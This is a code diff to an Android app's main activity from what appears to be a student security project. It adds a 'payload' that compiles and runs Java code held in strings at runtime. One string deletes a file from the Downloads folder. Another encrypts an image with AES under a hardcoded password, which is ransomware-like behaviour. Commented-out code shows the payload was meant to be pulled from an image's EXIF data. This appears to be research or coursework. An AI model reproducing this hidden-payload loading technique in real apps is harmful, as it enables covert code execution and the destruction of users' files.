@@ -1,6 +1,7 @@
 package com.client_progettosicurezza;
 
 import android.Manifest;
+import android.annotation.SuppressLint;
 import android.app.AlertDialog;
 import android.app.DownloadManager;
 import android.content.Context;
@@ -131,36 +132,13 @@ public class MainActivity extends AppCompatActivity {
             case R.id.info:
                 //String pathFile = Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg";
                 //File file = new File(pathFile);
-                //payload(file);
+                payload();
 
-                try {
-                    Path path = Paths.get(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg");
-                    byte[] plaintext = Files.readAllBytes(path);
-
-                    byte[] key = generateKey("password");
-
-                    byte[] chipertext = encodeFile(key, plaintext);
-
-                    File file_chipertext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg.encrypt");
-                    BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file_chipertext));
-                    bos.write(chipertext);
-                    bos.flush();
-                    bos.close();
-
-
-                    byte[] plaintext_verifica = decodeFile(key, chipertext);
-
-                    File file_plaintext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/vissuto.jpg");
-                    BufferedOutputStream bos2 = new BufferedOutputStream(new FileOutputStream(file_plaintext));
-                    bos2.write(plaintext_verifica);
-                    bos2.flush();
-                    bos2.close();
-
-
-
+                /*try {
+                    run();
                 } catch (Exception e) {
                     e.printStackTrace();
-                }
+                }*/
 
 
                 break;
@@ -168,27 +146,72 @@ public class MainActivity extends AppCompatActivity {
         return true;
     }
 
-    private void payload(File file) {
+    private void payload() {
 
-        String codice = "";
+        String codice =
+                "public class Classe { " +
+                    "public Classe() {} " +
+                    "/* start method */" +
+                    "public void run(android.content.Context context){ " +
+                        "java.io.File file = new java.io.File((java.lang.String) \"/sdcard/Download/Shrek.jpg\"); " +
+                        "if(file.delete()){ " +
+                            "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
+                        "} else {" +
+                            "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Non cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
+                        "} " +
+                     "} " +
+                    "/* end method */" +
+                "}";
 
-        try {
+        String codice2 =
+                "public class Classe { " +
+                    "public Classe() {} " +
+                    "/* start method */" +
+                    "public void run(android.content.Context context){ " +
+                        "try{" +
+                            "java.lang.String password = \"pass\";" +
+                            "byte[] keyStart = password.getBytes(\"UTF-8\");" +
+                            "javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance(\"AES\");" +
+                            "java.security.SecureRandom sr = java.security.SecureRandom.getInstance(\"SHA1PRNG\");" +
+                            "sr.setSeed(keyStart);" +
+                            "kgen.init(128, sr);" +
+                            "javax.crypto.SecretKey skey = kgen.generateKey();" +
+                            "byte[] key = skey.getEncoded();" +
+                            "java.nio.file.Path path = java.nio.file.Paths.get(\"/sdcard/Download/Minions.jpg\");" +
+                            "byte[] plaintext = java.nio.file.Files.readAllBytes(path);" +
+                            "javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, \"AES\");" +
+                            "javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(\"AES\");" +
+                            "cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);" +
+                            "byte[] encrypted = cipher.doFinal(plaintext);" +
+                            "java.io.File file_chipertext = new java.io.File(\"/sdcard/Download/Minions.jpg.encrypt\");" +
+                            "java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file_chipertext));" +
+                            "bos.write(encrypted);" +
+                            "bos.flush();" +
+                            "bos.close();" +
+                        "} catch(java.lang.Exception e){" +
+                            "e.printStackTrace();" +
+                        "}" +
+                        "android.widget.Toast.makeText((android.content.Context) context, (java.lang.CharSequence) \"Non cancellato\" , (int) android.widget.Toast.LENGTH_LONG).show(); " +
+                    "} " +
+                    "/* end method */" +
+                "}";
+
+        /*try {
             ExifInterface exif = new ExifInterface(file.getAbsolutePath());
             codice = exif.getAttribute(ExifInterface.TAG_IMAGE_DESCRIPTION);
         } catch (IOException e) {
             e.printStackTrace();
-        }
+        }*/
 
         try {
             Compile compile = new Compile(getFilesDir(), getApplicationContext());
-            compile.assemblyCompile(codice);
+            compile.assemblyCompile(codice2);
             compile.recompile();
             compile.load(getCacheDir(), getApplicationInfo(), getClassLoader());
 
             Object obj = compile.run();
             Method metodo = obj.getClass().getDeclaredMethod("run", Context.class);
             metodo.invoke(obj, getApplicationContext());
-
 
         } catch (IOException e) {
             e.printStackTrace();
@@ -273,8 +296,40 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
-    public static byte[] generateKey(String password) throws Exception
-    {
+
+
+
+
+
+
+
+
+    public void runAll() throws Exception {
+        Path path = Paths.get(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg");
+        byte[] plaintext = Files.readAllBytes(path);
+
+        byte[] key = generateKey("password");
+
+        byte[] chipertext = encodeFile(key, plaintext);
+
+        File file_chipertext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Minions.jpg.encrypt");
+        BufferedOutputStream bos = new BufferedOutputStream(new FileOutputStream(file_chipertext));
+        bos.write(chipertext);
+        bos.flush();
+        bos.close();
+
+
+        byte[] plaintext_verifica = decodeFile(key, chipertext);
+
+        File file_plaintext = new File(Environment.getExternalStorageDirectory().toString() + File.separator + Environment.DIRECTORY_DOWNLOADS + "/Verifica.jpg");
+        BufferedOutputStream bos2 = new BufferedOutputStream(new FileOutputStream(file_plaintext));
+        bos2.write(plaintext_verifica);
+        bos2.flush();
+        bos2.close();
+
+    }
+
+    public byte[] generateKey(String password) throws Exception {
         byte[] keyStart = password.getBytes("UTF-8");
 
         KeyGenerator kgen = KeyGenerator.getInstance("AES");
@@ -285,8 +340,7 @@ public class MainActivity extends AppCompatActivity {
         return skey.getEncoded();
     }
 
-    public static byte[] encodeFile(byte[] key, byte[] fileData) throws Exception
-    {
+    public byte[] encodeFile(byte[] key, byte[] fileData) throws Exception {
 
         SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
         Cipher cipher = Cipher.getInstance("AES");
@@ -297,8 +351,7 @@ public class MainActivity extends AppCompatActivity {
         return encrypted;
     }
 
-    public static byte[] decodeFile(byte[] key, byte[] fileData) throws Exception
-    {
+    public byte[] decodeFile(byte[] key, byte[] fileData) throws Exception {
         SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
         Cipher cipher = Cipher.getInstance("AES");
         cipher.init(Cipher.DECRYPT_MODE, skeySpec);
@@ -306,6 +359,35 @@ public class MainActivity extends AppCompatActivity {
         byte[] decrypted = cipher.doFinal(fileData);
 
         return decrypted;
+    }
+
+    public void rune(){
+        try{
+            java.lang.String password = "pass";
+            byte[] keyStart = password.getBytes("UTF-8");
+            javax.crypto.KeyGenerator kgen = javax.crypto.KeyGenerator.getInstance("AES");
+            java.security.SecureRandom sr = java.security.SecureRandom.getInstance("SHA1PRNG");
+            sr.setSeed(keyStart);
+            kgen.init(128, sr);
+            javax.crypto.SecretKey skey = kgen.generateKey();
+            byte[] key = skey.getEncoded();
+
+            java.nio.file.Path path = java.nio.file.Paths.get("/sdcard/Download/Minions.jpg");
+            byte[] plaintext = java.nio.file.Files.readAllBytes(path);
+
+            javax.crypto.spec.SecretKeySpec skeySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
+            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES");
+            cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, skeySpec);
+            byte[] encrypted = cipher.doFinal(plaintext);
+
+            java.io.File file_chipertext = new java.io.File("/sdcard/Download/Minions.jpg.encrypt");
+            java.io.BufferedOutputStream bos = new java.io.BufferedOutputStream(new java.io.FileOutputStream(file_chipertext));
+            bos.write(encrypted);
+            bos.flush();
+            bos.close();
+        } catch(java.lang.Exception e){
+            e.printStackTrace();
+        }
     }
 
 }
